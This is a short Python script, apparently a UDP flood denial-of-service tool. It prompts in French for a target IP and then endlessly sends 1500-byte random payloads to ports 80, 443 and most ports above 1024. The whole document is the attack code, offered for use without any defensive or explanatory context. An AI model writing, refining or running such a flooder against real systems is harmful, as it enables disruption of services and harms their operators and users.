import socket,random
site1 = input("IP à attacker: ")
# site2 = input("IP à attacker: ")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1500)
port = 1
sent = 0

class Target:
    def __init__(self, site):
        self.site = site
    
    def attack(self):
        if port in [80,443]:
            print(port)
            sock.sendto(bytes, (self.site,port))
        elif port >= 1024 and port % 4 != 0:
            print(port)
            sock.sendto(bytes, (self.site,port))

target1= Target(site1)

while True:
    target1.attack()
    port += 1